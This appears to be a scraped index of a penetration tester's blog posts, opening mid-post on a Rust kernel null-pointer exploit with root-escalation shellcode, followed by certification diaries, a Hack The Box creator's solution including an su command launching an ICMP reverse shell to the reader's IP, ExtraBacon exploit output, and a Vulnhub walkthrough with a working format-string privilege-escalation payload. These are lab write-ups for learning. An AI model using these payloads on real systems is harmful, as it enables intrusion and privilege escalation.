kernel through a module.I grabbed this opportunity to make this in rust, so i can get more familiar and better at it since i was debating with myself what should i learn? C or Rust?I ended up with Rust.Let’s explain vulnerability.So for null pointer deref vulnerability to exist, a developer must point after some action to NULL.Basically by being able to trigger the function to go to NULL, if we already have mapped the 0x00000000 page of the memory and put some delic.. i mean malicious code then it will be executed.Source code is already provided for us from the module, so we can track, detect and exploit.Below we see the important parts of the code, so we can trigger the vulnerability.Latest highlight say that for the whole thing to happen and somehow point the execution to NULL, we need to actually read the device.This will be the last step before executing an actual escalated shell.To actually manage and get to the vulnerable line(l.199), we need to actually write on the device according to the first highlight.Writing to the device is as simple opening it and send some data. The name of the device is called tostring and it can be found at /dev/tostring path.In the picture, there is a function copying from user space to kernel space. We need to have the right input to be able to lead the execution the l.199.For this to happen the input requires as to send 10 asterisks acccording to the highlight of the for loop.In addition, we need to set after the asterisks, S, as it will get us into the S case and the vulnerable function and last but not least a null byte at the end.If we will be able to send this plus our shellcode then we should be done!Now questions is what kind of shellcode do we send?According to the “linux msdn”, there are 2 functions that are always being called to assign the correct privileges in the linux system commit_creds() and prepare_kernel_cred().We would need to find the addresses of these 2 functions, simple task to achieve indeed.Now we need to write the shellcode accordingly. The shellcode basically needs to do commit_creds(prepare_kernel_cred(0)) .Shellcode:xor eax,eaxcall c10711f0 &amp;lt;—-prepare_kernel_cred()call c1070e80 &amp;lt;—-commit_creds()retWe null the eax, so it will be passed as a parameter to prepare_kernel_cred according to the calling convention and then, call commit creds as well with the return value of the prepare_kernel_cred to assign the 0 privileges aka root privileges.By assembling the above assembly, you will get this shellcode:“\\x31\\xc0\\xe8\\xe9\\x11\\x07\\xc1\\xe8\\x74\\x0e\\x07\\xc1\\xc3”Now for the exploit part in rust:And the result in the actual server is:" }, { "title": "Finally OSEE Certified!", "url": "/posts/finally-osee-certified/", "categories": "", "tags": "", "date": "2019-02-23 00:00:00 +0800", "snippet": "Well everyone, I finally did it and achieved this majestic certificate! What a journey this was…This exam was the most fun and challenging thing i have done in my life.So this challenge for the OSEE certification consisted of 2 challenges to be done in 72 hours + 24 hours more to do the reporting.1st Challenge:Challenges arrive at 10 PM i check them out to understand what i am supposed to do and messing with the first one little bit until 1AM.Then i decided to get to bed and do it the next morning.Next morning, i woke up at 10 AM and start doing the challenge. This and the other challenge were always had me like being stuck to a point then progressing then stuck again but i was moving quite fast and managed to finish the first challenge at 2PM.Of course this was the easy way that would give me 15 points! If i would do it the hard way, that would be 30 points.To pass this exam you need at least 80 so since I pwned this challenge, i was so happy i moved on to the second one(70 points)!I took some screenshots really quick and started the second challenge at 2:30 PM.2nd Challenge:I was quite positive on this one cause i had some minor experience, turns out I wasn’t as ready as i thought.I spent like 2 hours doing circle, trying to realize how to even start but then my observation “powers” kicked in and i realized what i had to do.I started progressing really fast for like 3 hours. Then i was stuck because of python issues or so i thought for like 4 hours! I decided to sleep and wake up in the morning at 9AM to continue…Before i slept and before i woke up i kept repeating why this doesn’t work? why why why? Like a psycho :P Then i checked it when i woke up and what do you know i had forgotten something….(i can’t say what).Since I managed to do this i started progressing a lot and then stuck again….I talked a bit on the phone, went to get something to drink, i got some fresh air and then continued.I managed to proceed and move further but then i stuck again. At this point i was so tired, i wanted to give up.But i continued, bypassed all the issues and managed to reach the latest point.I really had never done that before but it was easy enough, so managed to do it quite fast and got the final shell!I am not very patient person so i never tried the hard way of the first challenge, i just grabbed screenshots and wrote the report after a small break. I got the results last night so i am officially OSEE certified :DThe overall “clear” exam time took me 28 hours + 16 hours of sleep.BBBBBut what matters is that i did it and i will never regret paying this money for this amazing course, knowledge, exam and certificate." }, { "title": "Hack The Box Mischief Story", "url": "/posts/hack-the-box-mischief-story/", "categories": "", "tags": "", "date": "2019-02-04 00:00:00 +0800", "snippet": "Hello everyone, this is the creator of the Mischief machine.First of all thank you for all your amazing comments about my machine. I really appreciate them.Here are a few comments that i have seen you guys talking about it.This machine had some unexpected turns about the escalations and some other bugs. I have fully patched it on my personal lab but it would take too much effort to fix it on Hack the box.Obviously it was made to have only ONE solution. It looks like noone have found it or maybe someone did but i never saw it on comments.So first of all the issues started from the apache page. This page was supposed to be completely blind RCE but i fucked up :D (I am no web developer)The next mistake was preventing IPv6 outbound traffic. I fucked up once more with the iptables on IPv6.LXC was not an intended way at all but this vulnerability came by default with Ubuntu 18.04!Someone found a couple of different ways that i didn’t even know existed like systemd-run and pkttyagent. Now i know them.So i will leak you the actual solution here since the machine has been retired.So since the first mistake happened in the apache page, the way to get the password for loki user is indeed icmp data exfiltration! Some people found this.Then the root… How it was planned to happen… Since you would have obtained the password of root from the bash history like you did, then you would have to SCP an ICMP shell like ish.ICMP shells are required to be run as root to work on linux, so the way to do this , was (it was partially found) from the apache page through su which was enabled.The command that you should have ran is this: (sleep 1; echo lokipasswordmischieftrickery) | python -c “import pty; pty.spawn([‘/bin/su’,’-c’,’/dev/shm/ish -i 65535 -t 0 -p 1024 yourip’]);”I hope you liked the actual method. The purpose of my machines have always been , to make you learn new things that will actually help you in your pentests in real life or just allow you to gain more knowledge.I consider this machine Part 2 of my series, by first being sneaky. There will be one more machine, which will be the final one! I can tell you that it will push you to learn new things and level up in terms of knowledge.One more thing that i can spoil is that it will be a windows machine.Cheers everyone thanks for your support take care!" }, { "title": "AWE Course Review By Offensive-Security", "url": "/posts/awe-course-review-by-offensive-security/", "categories": "", "tags": "", "date": "2018-10-27 00:00:00 +0800", "snippet": "Hello everyone, it has been a while since i have posted but life and laziness got the better of me.I have been into the army and right after i joined Accenture in Prague.I have great news since i managed to attend AWE course from offensive security as the next step through my certification journey. For those that do not know, AWE course stands for Advanced Windows Exploitation and leads to the next certification from OFFSEC, called OSEE.It is quite hard to even get a sit for this course because usually it happens in Las Vegas and they don’t get many people for this. ( I think like 30 max, not sure)So basically you need to register asap when the registrations open but luckily OFFSEC provided the course in London the previous week and i managed to get a seat!The course was amazing and at the same time super hard. The instructors were awesome. Honestly i didn’t want the course to end.I know people have been saying the course is super hard and such but let me tell you, they are DEAD WRONG. IT IS SO SO SO SO SO FUCKING HARD THAT YOU CAN’T KEEP UP. If you are a master at roping and paging and structure expert of the kernel and its functions then you will be ok but unfortunately i was not.People ask me, how i was prepared and what to study to prepare for this, well my honest answer is that you can’t be prepared enough for this, just learn roping as good as you can.Good thing is that the instructors and the course do not expect from you to know it all.So let’s start with the review.1st Day: We started in a light manner by going through shellcode creation module which contained the mystical art of independent windows version shellcode creation without null bytes.(That was not so hard and we were still fine) Although the day was not even half way over(since we were doing the course like 8 hours per day for 5 days)and we started doing flash exploitation which was not very comfortable to do because it is not easy to debug it. Luckily OFFSEC had the answer for that. So we moved on a bit and the day was over. ( Still okay, we thought that we might survive this and in the end it wouldn’t be so hard….oh boy, were we wrong…)2nd Day: We continued doing flash exploitation the whole day creating ROPs and bypassing so many protections, that at point things stopped make sense(In my opinion this was the worst day), i can’t really say much, they just jammed information at us.3rd Day: The flash exploitation still was NOT over since EAF and Sandbox bypass came to play with us as well but in the end we bypassed. We still have like 5 hours on this day, so we moved onto the next module, Microsoft Edge(I was thinking this would be an easier module, which it was but still…), apparently as the instructor said Microsoft Edge is the most secure browser(maybe the worst performance wise) and he was right. We were bypassing protections and then we would add more and more and more but the day was over and we had to continue the next one.4th Day: Continuing with the Microsoft Edge exploitation, as if it wasn’t enough to bypass all these protections the instructor was adding more to absolutely laugh with microsoft edge being the most secure browser. In the end, i think we bypassed a total of 10 protections?( maybe more? maybe less? i really can’t remember, they were too many). This was the CRAZIEST exploit i have ever seen in my life.I can’t say what it did but trust me, it was crazy. Then we didn’t have much time and we dived a bit into kernel exploitation.(Good for me that i had spent some time on kernel exploitation the past year and i was easily able to keep up with the module)5th and last day: Last day, i was feeling a bit sad for the course to end but there is no time for crying. Kernel exploitation was here(it was the module that i wanted to check the most) and i was able to keep up relatively good, we did some amazing stuff there by tackling fortinet shield driver and getting a nice escalated shell.Overall the instructors and the course are amazing and i highly recommend it to everyone but i WARN you, the difficulty between OSCE and the AWE Course is huuuuge!They said the exam will be much easier than the course which makes sense because noone would pass.The instructors even gave us their emails so we can contact them for further questions.So offsec was pretty cool. Fun fact, they told us that only 1/3 of people that attend the course take the actual exam so you can imagine how hard it is. If you count it, the people that contain OSEE should be less than 150 people but maybe i am wrong.Bye everyone have a great day!" }, { "title": "EternalBlue NSA Leak Exploit Test!", "url": "/posts/eternalblue-nsa-leak-exploit-test/", "categories": "", "tags": "", "date": "2017-04-25 00:00:00 +0800", "snippet": "Hello everyone, sorry i have been away for a while, but i am serving currently in the army.Here is a teaser for the eternalblue exploit that was leaked by the NSA from the shadowbrokers combined with meterpreter!You can see the exploit being set and fired! And then using the doublepulsar to execute the meterpreter on the victim." }, { "title": "ExtraBacon Test On ASA Firewall", "url": "/posts/extrabacon-test-on-asa-firewall/", "categories": "", "tags": "asa, cisco, exploit, extrabacon, firewall, hacking, leaked, nsa, pentesting", "date": "2016-08-18 00:00:00 +0800", "snippet": "Hello everyone. i found some free time today and thought to give it a shot on extrabacon exploit of NSA’s Leaked stuff…there are already some successful articles out there about it but i wanted to show you what happens on a newer ASA firewall when the explot fails.Extrabacon exploit is a remote code execution exploit against Cisco Adaptive Security Appliance (ASA) devices affecting ASA versions 802, 803, 804, 805, 821, 822, 823, 824, 825, 831, 832, 841, 842, 843, 844. It exploits an overflow vulnerability using the Simple Network Management Protocol (SNMP) and relies on knowing the target’s uptime and software version.In my case i installed a firewall ASA 921 and of course it didn’t work as expected. This version is not affected.This is the outcome of the execution for info&amp;gt;root@trickster0-virtual-machine:/home/trickster0/Desktop/EXBA# python extrabacon_1.1.0.1.py info -t 192.168.0.128 -v -c publicWARNING: No route found for IPv6 destination :: (no default route?)Logging to /home/trickster0/Desktop/EXBA/concernedparent[+] Executing: extrabacon_1.1.0.1.py info -t 192.168.0.128 -v -c public[+] running from /home/trickster0/Desktop/EXBA[+] probing target via snmp[+] Connecting to 192.168.0.128:161**************[+] Data returned[+] 0000 30 7D 02 01 01 04 06 70 75 62 6C 69 63 A2 70 02 0}…..public.p.[+] 0010 01 00 02 01 00 02 01 00 30 65 30 3C 06 08 2B 06 ……..0e0&amp;lt;..+.[+] 0020 01 02 01 01 01 00 04 30 43 69 73 63 6F 20 41 64 …….0Cisco Ad[+] 0030 61 70 74 69 76 65 20 53 65 63 75 72 69 74 79 20 aptive Security [+] 0040 41 70 70 6C 69 61 6E 63 65 20 56 65 72 73 69 6F Appliance Versio[+] 0050 6E 20 39 2E 32 28 31 29 30 0F 06 08 2B 06 01 02 n 9.2(1)0…+…[+] 0060 01 01 03 00 43 03 00 92 E0 30 14 06 08 2B 06 01 ….C….0…+..[+] 0070 02 01 01 05 00 04 08 63 69 73 63 6F 61 73 61 …….ciscoasa###[ SNMP ]### version = community = \\PDU |###[ SNMPresponse ]### | id = | error = | error_index= | \\varbindlist | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value = [+] End of Data returned[+] response:###[ SNMP ]### version = community = \\PDU |###[ SNMPresponse ]### | id = | error = | error_index= | \\varbindlist | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value =[+] firewall uptime is 37600 time ticks, or 0:06:16[+] firewall name is ciscoasa[-] target is running Cisco Adaptive Security Appliance Version 9.2(1), which is NOT supportedData stored in key file : unsupportedData stored in self.vinfo: UNSUPPORTEDTo check the key file to see if it really contains what we’re claiming:cat /home/trickster0/Desktop/EXBA/keys/Y57qgB.keyThis is the output for the exec root@trickster0-virtual-machine:/home/trickster0/Desktop/EXBA# python extrabacon_1.1.0.1.py exec -t 192.168.0.128 -v -c public –mode pass-disableWARNING: No route found for IPv6 destination :: (no default route?)Logging to /home/trickster0/Desktop/EXBA/concernedparent[+] Executing: extrabacon_1.1.0.1.py exec -t 192.168.0.128 -v -c public –mode pass-disable[+] running from /home/trickster0/Desktop/EXBA[+] probing target via snmp[+] Connecting to 192.168.0.128:161**************[+] Data returned[+] 0000 30 7D 02 01 01 04 06 70 75 62 6C 69 63 A2 70 02 0}…..public.p.[+] 0010 01 00 02 01 00 02 01 00 30 65 30 3C 06 08 2B 06 ……..0e0&amp;lt;..+.[+] 0020 01 02 01 01 01 00 04 30 43 69 73 63 6F 20 41 64 …….0Cisco Ad[+] 0030 61 70 74 69 76 65 20 53 65 63 75 72 69 74 79 20 aptive Security [+] 0040 41 70 70 6C 69 61 6E 63 65 20 56 65 72 73 69 6F Appliance Versio[+] 0050 6E 20 39 2E 32 28 31 29 30 0F 06 08 2B 06 01 02 n 9.2(1)0…+…[+] 0060 01 01 03 00 43 03 00 E3 BC 30 14 06 08 2B 06 01 ….C….0…+..[+] 0070 02 01 01 05 00 04 08 63 69 73 63 6F 61 73 61 …….ciscoasa###[ SNMP ]### version = community = \\PDU |###[ SNMPresponse ]### | id = | error = | error_index= | \\varbindlist | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value = [+] End of Data returned[+] response:###[ SNMP ]### version = community = \\PDU |###[ SNMPresponse ]### | id = | error = | error_index= | \\varbindlist | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value = | |###[ SNMPvarbind ]### | | oid = | | value =[+] firewall uptime is 58300 time ticks, or 0:09:43[+] firewall name is ciscoasa[-] target is running Cisco Adaptive Security Appliance Version 9.2(1), which is NOT supportedData stored in key file : unsupportedData stored in self.vinfo: UNSUPPORTED[+] generating exploit for exec mode pass-disable[-] unsupported target version, abortI will try and test some more stuff for fun. Have a nice day everyone!" }, { "title": "OSWP Certified!", "url": "/posts/oswp-certified/", "categories": "", "tags": "certificate, exam, hacking, offensive-security, oswp, wireless", "date": "2016-08-12 00:00:00 +0800", "snippet": "Hello everyone. It has been a while since i last wrote an article, i was busy at work. I took the OSWP exam.OSWP exam was super easy! I finished in like 40 minutes and then immediately wrote the report for it.There was no WPS cracking but it included all the attacks about WEP and WPA.I studied the pdf in 4 hours, more like a quick read to remember stuff since i had my experience with wireless hacking.After a few days my pass verification email arrived. Nothing more to add on this subject. I am ready to take the OSCE exam now :)Something irrelevant with the exam, i found my first 0Day in the company i work about unauthenticated database download in the web application of an embedded custom device, that my company provides to clients. :) Unfortunately, they won’t allow me to release the POC :’(That is all folks, have fun, bye!" }, { "title": "OSCP Day 26", "url": "/posts/oscp-day-26/", "categories": "", "tags": "", "date": "2016-04-16 00:00:00 +0800", "snippet": "Hey everyone. I have finished hacking all the machines in the labs(public,dev,it,admin) since last night. The experience was great i learnt a couple of things i didnt know, i used ssh portfwd that i had never used before, cause i didnt need to! As an overall review of the machines, i can say that they were super fun, i enjoyed especially the dev network which happened to be the last one i hacked ^_^.So the machines in the labs are 49 if you exclude the msf pro one , which you do not hack, and i completed all of them :D Lets just hope so that the exam will seem easy to me too! That is it!Many thanks to Haken29a which helped me A LOT as an admin with some issues,Haken if u see this thx a lot talk to me in the irc some time :P. Almost all the admins were great(only 1 bad comes to mind i won’t say who :P).Have fun everyone… if you have any questions please dont hesitate to ask, i will be on irc or you can leave a comment here, bye ;)" }, { "title": "OSCP Day 23", "url": "/posts/oscp-day-23/", "categories": "", "tags": "", "date": "2016-04-13 00:00:00 +0800", "snippet": "After so many days i decided to write my next review! everything is great 10 machines left for finishing the whole lab(including IT,dev,admins). This was a great experience and i learnt a couple of new things! i will write one more review when i finish! it should be in 2-3 days. It took me a while cause i went in a trip for 3 days for a ctf(very hard one with TOO much Social engineering). So after a point machines seemed like a child’s play although i had some issues with proxychains, i hope noone will meet them :D Up till now i can say that the hardest machines were freebsd,humble. That is it for me! cya on my next review!! HAVE FUN EVERYONE!" }, { "title": "OSCP Day 10", "url": "/posts/oscp-day-10/", "categories": "", "tags": "", "date": "2016-04-01 00:00:00 +0800", "snippet": "I haven’t been writing for a while about the lab cause i was obsessed with it and kept solving machines or going out.So i have hacked about 21 machines in total i think included pain and sufferance! I am gonna comment only to those hard ones. Well pain is not a hard one! it is very easy! i think the rumour about it being hard is what makes it hard for people. Actually it was one of the easiest machines i have solved so dont get intimidated! Now about sufferance… sigh…it took me 3 days and someone gave me a hint about the exploit for getting a priv shell. i started great on it got access to all the folders including proof but i had to get the root shell! so i searched for exploits, found the right one but offsec had different plans from me succeeding!That is where i got a hint and managed to get a low priv shell. Then it took me 1 day to finally find how to priv escalation! This machine wasnt easy but not hard either! it takes time though, especially at the part that i got a hint! that is all! tomorrow i am gonna fight with humble and hopefully get root fast :D Have fun everyone!" }, { "title": "OSCP Day 4", "url": "/posts/oscp-day-4/", "categories": "", "tags": "", "date": "2016-03-24 00:00:00 +0800", "snippet": "This was the worst day in the lab! I probably wasted most of the time of the day in front of my screen. I pwned two machines today. First one was redhat really easy, it took less than 1 hour.The next machine although took the rest of my day… :’( it was horrible and its name is freebsd! Worst machine i have encountered yet! lets hope tomorrow won’t be that bad :D That is it everyone have a nice time." }, { "title": "OSCP Day 3", "url": "/posts/oscp-day-3/", "categories": "", "tags": "", "date": "2016-03-22 00:00:00 +0800", "snippet": "Everybody, i dont know if it is the practise or something but the lab seems to be getting easier :P I pwned 3 machines today! First was phoenix which had a difficult moment but in general it was super easy! Then i fought with the kraken(yes another mythical creature), that couldnt be any easier. Last machine was mike. Mike was easy too although to actually get the price you needed to complex the things a little bit , but still it was easy too! Let’s see what 2morrow has for me ^_^ I know i haven’t checked pain,sufferance or humble but the time will come! Have fun Everyone and that is the way it is!" }, { "title": "OSCP Day 2", "url": "/posts/oscp-day-2/", "categories": "", "tags": "", "date": "2016-03-22 00:00:00 +0800", "snippet": "Hello everyone! Things are going super great! i managed to pwn 2 boxes! Bob and Oracle. Bob was a very interesting box and i mean it. It taught me windows commands that i never thought i would learn without looking at them :P hahaha the priv escalation aspect was pretty good. Oracle was like umm not saying :P Checking the next box right now, phoenix, let’s how things will go ;)Have fun everyone take care!" }, { "title": "OSCP Day 1", "url": "/posts/oscp-day-1/", "categories": "", "tags": "", "date": "2016-03-20 00:00:00 +0800", "snippet": "So i just started the OSCP and got my lab access today. I writing this while i am w8ing for nikto and dirb to do their jon. Lab is great i pwned my first machine alice in about 1 hour and then moved on to the second one gh0st which took me about half a day cause i stuck on the last step. Right now i am checking on my third machine. Everything is great and the admins are great, at least the ones i have talked too. Haken29a is super friendly and helpful! Greetz to u dear sir, thx for ur help. I am gonna try to fill in for the blog infos about my progress without giving away anything of course but i can tell you this! Devil is in the details :P Everyone have fun and move forward with your lives ^_^" }, { "title": "OSCP", "url": "/posts/oscp/", "categories": "", "tags": "", "date": "2016-02-15 00:00:00 +0800", "snippet": "I am finally gonna get registered for oscp in a couple of days!!! so excited and horrified at the same time but i am sure i will make it! i will try to write what i believe every 3 days. lets move on to the success part!SUCCESS IS JUST AROUND THE CORNER!!!!" }, { "title": "Happy New Year 2016", "url": "/posts/happy-new-year-2016/", "categories": "", "tags": "", "date": "2016-01-01 00:00:00 +0800", "snippet": "layout: posttitle: Happy New Year 2016tags: []—&amp;gt;#!/usr/bin/pythonprint ‘’’I wish happy new year’s eve 2016 to everyone. I wish it will work out better than the previous one, with positibe energy and kindness! The best are yet to come, dont think of the past, focus on the present and always look forward to the future!HAPPY NEW YEAR’S EVE 2016‘’‘" }, { "title": "Pegasus Timbeeeeer!!!! Walkthrough!", "url": "/posts/pegasus-timbeeeeer-walkthrough/", "categories": "", "tags": "challenge, hacking, pegasus, timber, vm, vulnhub", "date": "2015-11-24 00:00:00 +0800", "snippet": "Hello everyone this is pegasus VM walkthrough for practising and having fun :Dgreetings to everyone for creating this great challengeI started by running nmap to check all the services that pegasus has on it!&amp;gt;root@Tesla:~# nmap 192.168.7.138 -p- -AStarting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-11-05 17:51 EETNmap scan report for 192.168.7.138 (192.168.7.138)Host is up (0.00016s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA)| 2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA)|_ 256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 36231/udp status|_ 100024 1 42084/tcp status8088/tcp open http nginx 1.1.1942084/tcp open status 1 (RPC #100024)MAC Address: 00:0C:29:EA:73:26 (VMware)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.19Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelmoreafter seing these services i checked the nginx server right away to see what the webserver had for usNothing obvious there, although i downloaded the picture and checked it with strings it gave some interesting results..it gave 2 sets of characters i thought that it might want to hint me on making a wordlist with them but i gave up on it and moved on. next thing i did,was to use dirb to find any secret folders/files but it gave nothing! after a lot of search i checked on another walkthrough and people used dirbuster with another wordlist and so did isubmit.php file did nothing on its own but apparently it was used with the other file codereview.php file i foundApparently it wanted to hint me that this box would run some inputted code of mine. so i started pasting python,php,perl reverse shells but nothing until i tried C and magic actually happened!!!i used this shelli didnt like my shell :/ i needed something better plus the fact that the shell would stop after a while and disconnect me so i created really quick some ssh-keygen and inserted my public key into the authorized_keys. So i connected through ssh :Di did some enumeration to the system look around, but nothing interesting except from a fail named my_first. So as the name stated it is a noob’s first program so it is fair to assume that there is a vuln there isn’t it? Also the code that i could execute was C so this is obvious a wannabe C master…Since everything is in C i supposed Format strings vulnerabillities(which as a matter of fact i hate). Not to add that this program will give us elevated rights so one more reason to try using it for our “legal” purpose. I will try to explain what i did as good as i can…I executed the program to check it outit is about time testing it for format string vulnobiously at the first try i checked for a normal input but at the second try i actually tested it. so what do we see there?? this is a so called format string vuln. how does it work?? when someone compiles a C program and uses some vulnerable functions like printf(and all of its damn family) like this printf (“hi”,%x) what it actually does is put the input at the top of the stack so we request it by asking %x in the inputs of the program to show the address of the stack in hex. so in the second input on the second try we added some %x to get more of the addresses in the stack. On my next step i changed my input a little bit. i added some A’sAdter some testing i noticed that i dont need to input format strings on the first input… only the second one had the error. So what did i do here? i added some A’s and some %x’s to see if somewhere along the memory i managed to change an address and after 8 %x’s we can see that the address now is 41414141 which in ascii is AAAA. so apparently we managed to change the memory address there. The system was running ASLR so i ran ulimit -s unlimitedafter that i ran the program on gdb to figure out a few addresses like the system()’s addressnext thing i had to find would be the printf’s function addressi used objdump, nothing more to add herenext thing i did, was to create a small payload by using the program automatically and actually write the printf’s address into the address that we previously changed into AAAAs. how do we do this you ask? well it is really simple we have this amazing format string called %n that will allow us to do it.Plus we before this part on our payload we specified the 8th position of the address. here is what happenedsee? we wrote 4 on the address where we got the segfault so that is good now we need to change that address into the system() address that we have. lets start by getting the second half. we need to find in decimal 0x9060-0x4 mike@pegasus:~$ python -c ‘print 0x9060-0x4’36956i changed a little bit my next payload and ran gdb again to see if we succeeeded in chaniging the second half of the address mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08%%36956u%%8$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ��Program received signal SIGSEGV, Segmentation fault.0x00009060 in ?? ()(gdb) mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08%%36956u%%8$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ��Program received signal SIGSEGV, Segmentation fault.0x00009060 in ?? ()(gdb) mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08%%36956u%%8$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ��Program received signal SIGSEGV, Segmentation fault.0x00009060 in ?? ()(gdb)As we can see everything worked out! now we need to change the first half. here is what we did mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%9$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ����Program received signal SIGSEGV, Segmentation fault.0x90609060 in ?? ()(gdb) mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%9$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ����Program received signal SIGSEGV, Segmentation fault.0x90609060 in ?? ()(gdb) mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%9$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ����Program received signal SIGSEGV, Segmentation fault.0x90609060 in ?? ()(gdb)In this case we wrote 4 more bytes so teh 36956 went down to 36952. Now we need to find the decimal for the first half mike@pegasus:~$ python -c ‘print 0x14006-0x9060’44966so i changed my payload again and ran gdb mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%44966u%%9$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ���� sh: 1: Selection:: not foundProgram received signal SIGSEGV, Segmentation fault.0x08c3be89 in ?? ()(gdb) mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%44966u%%9$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ���� sh: 1: Selection:: not foundProgram received signal SIGSEGV, Segmentation fault.0x08c3be89 in ?? ()(gdb) mike@pegasus:~$ printf ‘1\\n1\\n\\xfc\\x9b\\x04\\x08\\xfe\\x9b\\x04\\x08%%36952u%%8$n%%44966u%%9$n’ &amp;gt; payloadmike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done.(gdb) r &amp;lt; payload Starting program: /home/mike/my_first &amp;lt; payloadWELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ���� sh: 1: Selection:: not foundProgram received signal SIGSEGV, Segmentation fault.0x08c3be89 in ?? ()(gdb)If you can see the sh: 1: Selection:: then it means we have accomplished out goal and victory should be closer mike@pegasus:~$ touch Selection:mike@pegasus:~$ nano Selection: mike@pegasus:~$ chmod +x Selection: mike@pegasus:~$ export PATH=$PATH:.mike@pegasus:~$ echo PATHPATHmike@pegasus:~$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:.mike@pegasus:~$ cat payload | ./my_first WELCOME TO MY FIRST TEST PROGRAM——————————–Select your tool:[1] Calculator[2] String replay[3] String reverse[4] ExitSelection: Enter first number: Enter second number: Error details: ���� Segmentation fault (core dumped)mike@pegasus:~$ ls -la /tmptotal 108drwxrwxrwt 2 root root 4096 Nov 23 03:19 .drwxr-xr-x 22 root root 4096 Nov 19 2014 ..-rwsr-sr-x 1 john mike 100284 Nov 23 03:19 dashmike@pegasus:~$As you notice, above, i created a file named Selection: and made it executable 